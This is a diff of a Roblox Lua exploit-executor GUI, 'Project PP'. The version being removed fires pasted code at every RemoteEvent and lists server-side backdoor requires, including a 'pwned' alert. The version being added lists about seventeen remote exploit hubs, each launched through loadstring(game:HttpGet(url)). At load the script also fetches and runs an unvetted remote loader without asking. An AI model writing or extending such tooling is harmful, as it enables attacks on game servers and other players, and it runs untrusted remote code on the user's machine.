@@ -1,188 +1,185 @@
 local player = game.Players.LocalPlayer
-local pName = player.Name
-local UIS = game:GetService("UserInputService")
-
 local scr = Instance.new("ScreenGui")
-scr.Name = "ProjectPP_DarkMode_Fixed"
+scr.Name = "ProjectPP"
 scr.ResetOnSpawn = false
 scr.Parent = player:WaitForChild("PlayerGui")
 
--- [ Main Frame - 600x350 ] --
+-- Main Frame
 local main = Instance.new("Frame", scr)
 main.Size = UDim2.new(0, 600, 0, 350)
 main.Position = UDim2.new(0.5, -300, 0.5, -175)
-main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+main.BackgroundColor3 = Color3.fromRGB(255,255,255)
 main.BorderSizePixel = 1.85
-main.BorderColor3 = Color3.fromRGB(60, 60, 60)
-main.Active = true -- สำคัญมากเพื่อให้ลากได้
-main.Draggable = true -- เปิดระบบลากพื้นฐานของ Roblox เพื่อความชัวร์
+main.BorderColor3 = Color3.fromRGB(0,0,0)
 
--- [ Title & Owner ] --
+-- Title
 local title = Instance.new("TextLabel", main)
 title.Size = UDim2.new(0, 400, 0, 40)
-title.Position = UDim2.new(0, 15, 0, 5)
-title.Text = "Project PP {Dark Mode}"
-title.TextSize = 26
-title.Font = Enum.Font.SourceSansBold
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.Text = "Project PP Classic"
+title.TextSize = 28
 title.BackgroundTransparency = 1
-title.TextXAlignment = Enum.TextXAlignment.Left
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
 
-local desc = Instance.new("TextLabel", main)
-desc.Size = UDim2.new(0, 400, 0, 20)
-desc.Position = UDim2.new(0, 15, 0, 35)
-desc.Text = "private gui by pun_punPP102030"
-desc.Font = Enum.Font.SourceSansItalic
-desc.TextSize = 14
-desc.TextColor3 = Color3.fromRGB(150, 150, 150)
-desc.BackgroundTransparency = 1
-desc.TextXAlignment = Enum.TextXAlignment.Left
-
--- [ 1. ระบบลาก (Drag System) แบบลื่นไหล ] --
-local dragging, dragInput, dragStart, startPos
-local function update(input)
-    local delta = input.Position - dragStart
-    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
-
-main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = main.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
-    end
-end)
-
-main.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-UIS.InputChanged:Connect(function(input)
-    if dragging and input == dragInput then update(input) end
-end)
-
--- [ Input Box Zone (คำไม่ออกนอกกรอบ) ] --
+-- Input Box
 local inputFrame = Instance.new("Frame", main)
 inputFrame.Size = UDim2.new(0, 420, 0, 220)
-inputFrame.Position = UDim2.new(0, 10, 0, 60)
-inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+inputFrame.Position = UDim2.new(0, 10, 0, 50)
+inputFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
 inputFrame.BorderSizePixel = 1.85
-inputFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
+inputFrame.BorderColor3 = Color3.fromRGB(0,0,0)
 
 local input = Instance.new("TextBox", inputFrame)
 input.Size = UDim2.new(1, -10, 1, -10)
 input.Position = UDim2.new(0, 5, 0, 5)
-input.BackgroundTransparency = 1
+input.BackgroundColor3 = Color3.fromRGB(255,255,255)
 input.Text = ""
-input.TextSize = 16
+input.TextSize = 18
 input.MultiLine = true
 input.ClearTextOnFocus = false
 input.TextWrapped = true
-input.Font = Enum.Font.Code
-input.TextColor3 = Color3.fromRGB(255, 255, 255)
 input.TextXAlignment = Enum.TextXAlignment.Left
 input.TextYAlignment = Enum.TextYAlignment.Top
-input.PlaceholderText = "Paste Lua or SS Require here..."
+input.Font = Enum.Font.Code
+input.PlaceholderText = "Paste or type your script here..."
 
--- [ 2. กรอบ Require List (ด้านขวา) ] --
-local scriptTitle = Instance.new("TextLabel", main)
-scriptTitle.Size = UDim2.new(0, 150, 0, 35)
-scriptTitle.Position = UDim2.new(0, 440, 0, 15)
-scriptTitle.Text = "Require List"
-scriptTitle.TextSize = 20
-scriptTitle.Font = Enum.Font.SourceSansBold
-scriptTitle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-scriptTitle.BorderSizePixel = 1.85
-scriptTitle.BorderColor3 = Color3.fromRGB(60, 60, 60)
-scriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+-- Buttons
+local btnFrame = Instance.new("Frame", main)
+btnFrame.Size = UDim2.new(0, 420, 0, 70)
+btnFrame.Position = UDim2.new(0, 10, 0, 280)
+btnFrame.BackgroundTransparency = 1
 
-local scriptFrame = Instance.new("ScrollingFrame", main)
-scriptFrame.Size = UDim2.new(0, 150, 0, 280)
-scriptFrame.Position = UDim2.new(0, 440, 0, 55)
-scriptFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
-scriptFrame.BorderSizePixel = 1.85
-scriptFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
-scriptFrame.CanvasSize = UDim2.new(0, 0, 0, 1200)
-scriptFrame.ScrollBarThickness = 5
-
--- [ รายการสคริปต์ ] --
-local scripts = {
-    {Title="OWNERS SS", Code='require(92684888032460)({Owners = {"'..pName..'"}})'},
-    {Title="ALERT PWN", Code='require(10557341183).alert("'..pName..'", "you got pwned kid")'},
-    {Title="SPACE LIB", Code='require(5702244094).space("'..pName..'")'},
-    {Title="EAGLE CORE", Code='require(6032524768).Eagle("'..pName..'")'},
-    {Title="SF V3 PC", Code='require(132592022786319).SFV3PC("'..pName..'")'}
-}
-
-for i, s in ipairs(scripts) do
-    local b = Instance.new("TextButton", scriptFrame)
-    b.Size = UDim2.new(1, -10, 0, 35)
-    b.Position = UDim2.new(0, 5, 0, (i-1)*40 + 5)
-    b.Text = s.Title
-    b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    b.TextColor3 = Color3.fromRGB(255, 255, 255)
-    b.Font = Enum.Font.SourceSansBold
-    b.TextSize = 14
-    b.BorderSizePixel = 0
-    b.MouseButton1Click:Connect(function()
-        input.Text = s.Code
-        input:CaptureFocus()
-    end)
-end
-
--- [ 3. Buttons Zone (ปรับสีปุ่ม CLR เป็นสีแดง) ] --
-local function createBtn(x, text, color)
-    local frame = Instance.new("Frame", main)
-    frame.Size = UDim2.new(0, 100, 0, 50)
-    frame.Position = UDim2.new(0, x + 10, 0, 290)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+local function createButton(x,text)
+    local frame = Instance.new("Frame", btnFrame)
+    frame.Size = UDim2.new(0, 190, 0, 60)
+    frame.Position = UDim2.new(0, x, 0, 5)
+    frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
     frame.BorderSizePixel = 1.85
-    frame.BorderColor3 = Color3.fromRGB(60, 60, 60)
+    frame.BorderColor3 = Color3.fromRGB(0,0,0)
 
     local btn = Instance.new("TextButton", frame)
-    btn.Size = UDim2.new(1, 0, 1, 0)
-    btn.BackgroundTransparency = 1
+    btn.Size = UDim2.new(1, -10, 1, -10)
+    btn.Position = UDim2.new(0, 5, 0, 5)
     btn.Text = text
-    btn.TextColor3 = color
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 16
+    btn.TextSize = 20
+    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    btn.TextColor3 = Color3.fromRGB(0,0,0)
+
     return btn
 end
 
-local execLua = createBtn(0, "EXEC LUA", Color3.fromRGB(0, 255, 150))
-local execSS  = createBtn(105, "EXEC SS", Color3.fromRGB(0, 150, 255))
-local clrBtn  = createBtn(210, "CLR", Color3.fromRGB(255, 0, 0)) -- เปลี่ยนเป็นสีแดงตามสั่ง
-local conBtn  = createBtn(315, "CONSOLE", Color3.fromRGB(255, 150, 0))
+local execBtn = createButton(5,"EXEC")
+local clrBtn  = createButton(210,"CLR")
 
--- [ Logic ] --
-execLua.MouseButton1Click:Connect(function()
-    if input.Text ~= "" then
-        local f = loadstring(input.Text)
-        if f then pcall(f) end
+-- Script Tab Title
+local scriptTitle = Instance.new("TextLabel", main)
+scriptTitle.Size = UDim2.new(0, 150, 0, 35)
+scriptTitle.Position = UDim2.new(0, 440, 0, 10)
+scriptTitle.Text = "SCRIPT List"
+scriptTitle.TextSize = 20
+scriptTitle.BackgroundColor3 = Color3.fromRGB(255,255,255)
+scriptTitle.BorderSizePixel = 1.85
+scriptTitle.BorderColor3 = Color3.fromRGB(0,0,0)
+scriptTitle.TextColor3 = Color3.fromRGB(0,0,0)
+
+-- Script Frame
+local scriptFrame = Instance.new("ScrollingFrame", main)
+scriptFrame.Size = UDim2.new(0, 150, 0, 290)
+scriptFrame.Position = UDim2.new(0, 440, 0, 50)
+scriptFrame.CanvasSize = UDim2.new(0, 0, 0, 1000)
+scriptFrame.ScrollBarThickness = 6
+scriptFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
+scriptFrame.BorderSizePixel = 1.85
+scriptFrame.BorderColor3 = Color3.fromRGB(0,0,0)
+
+-- Script List
+local scripts = {
+    {Title="project broken spawn",URL="https://pastebin.com/raw/NyJfL0ey"},
+    {Title="ssp",URL="https://pastefy.app/XHqVeb0d/raw"},
+    {Title="BiPolaria",URL="https://pastebin.com/raw/8qFWEtWY"},
+    {Title="Polaria",URL="https://pastefy.app/agqEB2qs/raw"},
+    {Title="KlausGui ss",URL="https://pastebin.com/raw/Y0CYLJ6z"},
+    {Title="luau x ss v3",URL="https://raw.githubusercontent.com/gojohdkaisenkt2/Gojohdkaisenkt-/refs/heads/main/L"},
+    {Title="luau x ss v5",URL="https://rawscripts.net/raw/Universal-Script-Luau-X-SS-V5-rework-50365"},
+    {Title="c00lgui",URL="https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"},
+    {Title="ExSer",URL="https://pastefy.app/7sO8ckTL/raw"},
+    {Title="stigma ultimate",URL="https://raw.githubusercontent.com/C-Dr1ve/Executor-Remakes-In-Lua/refs/heads/main/Remakes/Stigma_Revision_0.lua"},
+    {Title="venguim",URL="https://pastefy.app/j3yyullx/raw"},
+    {Title="Ro Xploit tiny",URL="https://raw.githubusercontent.com/Kroostal/Ro-Xploittinyhub/refs/heads/main/RoXploit%20TinyHub"},
+    {Title="Ro Xploit",URL="https://pastebin.com/raw/0hryQeGw"},
+    {Title="SF",URL="https://raw.githubusercontent.com/g00byd0lanxdd/SF-1.5-MOBILE/refs/heads/main/SF%201.5%20MOBILE"},
+    {Title="Rc7 blue",URL="https://pastebin.com/raw/zkeLwfT6"},
+    {Title="Rc7 back",URL="https://pastebin.com/raw/b787QKMQ"},
+    {Title="Project Primalia SS",URL="https://rawscripts.net/raw/Universal-Script-Project-Primalia-SS-63706"},
+}
+
+local y = 10
+for _, s in ipairs(scripts) do
+    local b = Instance.new("TextButton", scriptFrame)
+    b.Size = UDim2.new(1, -10, 0, 40)
+    b.Position = UDim2.new(0, 5, 0, y)
+    b.Text = s.Title
+    b.TextSize = 15
+    b.Font = Enum.Font.SourceSansBold
+    b.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    b.BorderSizePixel = 1.85
+    b.BorderColor3 = Color3.fromRGB(0,0,0)
+    b.TextColor3 = Color3.fromRGB(0,0,0)
+
+    b.MouseButton1Click:Connect(function()
+        input.Text = [[loadstring(game:HttpGet("]] .. s.URL .. [[",true))()]]  -- loadstring + URL ตรงๆ
+        input:CaptureFocus()  -- focus ไป input อัตโนมัติ
+    end)
+
+    y += 45
+end
+
+scriptFrame.CanvasSize = UDim2.new(0, 0, 0, y)
+
+-- Execute / Clear
+execBtn.MouseButton1Click:Connect(function()
+    if input.Text ~= "" and input.Text ~= input.PlaceholderText then
+        loadstring(input.Text)()
     end
 end)
 
-execSS.MouseButton1Click:Connect(function()
-    if input.Text ~= "" then
-        local code = input.Text
-        task.spawn(function()
-            for _, v in pairs(game:GetDescendants()) do
-                if v:IsA("RemoteEvent") then
-                    pcall(function() v:FireServer(code) end)
-                    task.wait(0.01)
-                end
-            end
+clrBtn.MouseButton1Click:Connect(function()
+    input.Text = ""
+end)
+
+input.Text = [[print("made by pun_punPP102030")]]
+
+-- Full Window Drag
+local UIS = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local d = input.Position - dragStart
+    main.Position = UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
+end
+
+main.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = i.Position
+        startPos = main.Position
+        i.Changed:Connect(function()
+            if i.UserInputState == Enum.UserInputState.End then dragging = false end
         end)
     end
 end)
 
-clrBtn.MouseButton1Click:Connect(function() input.Text = "" end)
-conBtn.MouseButton1Click:Connect(function() game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F9, false, game) end)
+main.InputChanged:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
+        dragInput = i
+    end
+end)
 
--- [ Finalize ] --
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/popohoyo1029384756-hub/Project_PP_Classic_LoadingGui/refs/heads/main/PPPCLG.lua"))() end)
+UIS.InputChanged:Connect(function(i)
+    if dragging and i == dragInput then update(i) end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/popohoyo1029384756-hub/Project_PP_Classic_LoadingGui/refs/heads/main/PPPCLG.lua"))()
+
+print("Project PP GUI loaded")
